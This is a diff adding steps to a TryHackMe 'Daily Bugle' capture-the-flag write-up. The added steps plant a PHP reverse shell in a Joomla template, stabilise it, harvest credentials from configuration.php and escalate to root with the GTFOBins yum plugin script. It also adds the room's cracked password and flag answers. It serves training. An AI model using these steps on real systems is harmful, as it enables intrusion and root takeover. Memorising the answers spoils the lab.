@@ -145,12 +145,134 @@ john -format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt jonah.hash
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT17.png?raw=true)<br />
 Success! Let John do it's thing, once you get the password answer the question and move to the next section.
 
-## Username and Password attempts
-
 Let's try the username and password we got previously on the administrator page of Joomla on the HTTP service.
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT18.png?raw=true)<br />
-Success! Let's have a look around the Control Panel and see what's accessible to us.
 
+## Getting a remote shell
+
+Success! Let's have a look around the Control Panel and see what's accessible to us. After looking around for a little while, 
+I decide to try uploading a reverse shell... We could do this a few ways but I'll edit the current template and edit one of the PHP files.<br />
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT19.png?raw=true)<br />
+As you can see from the image above, I have chosen to edit the index.php template to my PHP reverse shell. But first I'll need to set a listener on my AttackBox.<br />
+```shell
+nc -lvnp 8888
+```
+Now let's set the theme we edited to the default theme as shown below, then head over to the index.php file to initiate the connection.<br />
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT20.png?raw=true)<br />
+Success! We now have a shell working as shown below, let's make our shell stable and then see if we can find the user flag!<br />
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT21.png?raw=true)<br />
+To make our shell stable we will use Python! Let's do this below<br />
+```shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+## System Recon
+
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT22.png?raw=true)<br />
+Now we have a stable shell, let's look for the users flag! Navigate over to the /home directory and use the ls command to list the directories/files.<br />
+```shell
+cd /home/
+ls -la
+```
+Let's try getting into jjameson
+```shell
+cd /jjameson
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT23.png?raw=true)<br />
+Well, looks like we'll need to get another account or escalate our privileges to get into their folder. Let's have a look around and see what we can find.<br />
+After having around the system I decided to go back into the web directory to see if there were any interesting configuration files, there is!<br />
+```shell
+cd /usr/var/www/html
+ls
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT24.png?raw=true)<br />
+Can you see the interesting file? configuration.php stands out to me, let's have a look inside.
+```shell
+cat configuration.php
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT25.png?raw=true)<br />
+Voila! Some interesting credentials... Maybe we could try to login to the root user with these credentials?<br />
+```shell
+su root
+su jjameson
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT26.png?raw=true)<br />
+I tried to login as root and that failed, but the password worked for jjameson! Let's check out the directory we couldn't access earlier.<br />
+```shell
+cd /home/jjameson
+ls -la
+```
+Let's check out the user.txt<br />
+```shell
+cat user.txt
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT27.png?raw=true)<br />
+Success! Now we have the answer for the user flag, all that's left is to find root's flag. Let's continue looking around.
+
+## Privilege Escalation
+
+After looking around on the system for a while I couldn't find any other credentials, it looks like we're going to have to start looking for ways to escalate our privileges. Let's start with the kernel version.<br />
+```shell
+uname -a
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT28.png?raw=true)<br />
+I couldn't find anything noteworthy on this kernel version, let's move on.<br />
+
+Next I looked for files with the SUID bit
+```shell
+find / -perm -u=s -type f 2>/dev/null
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT29.png?raw=true)<br />
+I couldn't see anything so I moved on.<br />
+
+Now let's look if we can run anything as sudo.<br />
+```
+sudo -l
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT30.png?raw=true)<br />
+Interesting... Let's check out GTFObins and see if we can use yum to get root privileges.
+```
+https://gtfobins.github.io/gtfobins/yum/
+```
+So it's possible to exploit yum by generating our own rpm package and installing it on the target. Let's do this now.<br />
+
+### Using GTFObins to escalate our privileges
+
+We're going to use method B "b) Spawn Interactive root shell by loading a custom plugin." Let's have a look at what we need to enter below<br />
+<b>Note: If you don't understand what you're doing here, I've explained it at the bottom of the page.</b><br />
+```shell
+TF=$(mktemp -d)
+cat >$TF/x<<EOF
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF
+
+cat >$TF/y.conf<<EOF
+[main]
+enabled=1
+EOF
+
+cat >$TF/y.py<<EOF
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+  os.execl('/bin/sh','/bin/sh')
+EOF
+sudo yum -c $TF/x --enableplugin=y
+```
+If you have entered the commands correctly then you will now be a root user!<br />
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT32.png?raw=true)<br />
+Let's get the last flag and complete this room/box.
+```shell
+cd /root
+ls
+cat root.txt
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT33.png?raw=true)<br />
 
 ## Questions & Answers
 
@@ -161,13 +283,13 @@ Question 2:<br />
 **What is the Joomla version?** 3.7.0<br />
 
 Question 3:<br />
-**What is Jonah's cracked password?** <br />
+**What is Jonah's cracked password?** spiderman123<br />
 
 Question 4:<br />
-**What is the user flag?** <br />
+**What is the user flag?** 27a260fe3cba712cfdedb1c86d80442e<br />
 
 Question 5:<br />
-**What is the root flag?** <br />
+**What is the root flag?** eec3d53292b1821868266858d7fa6f79<br />
 
 ### Farewell, I hope you all enjoyed this write-up!
 
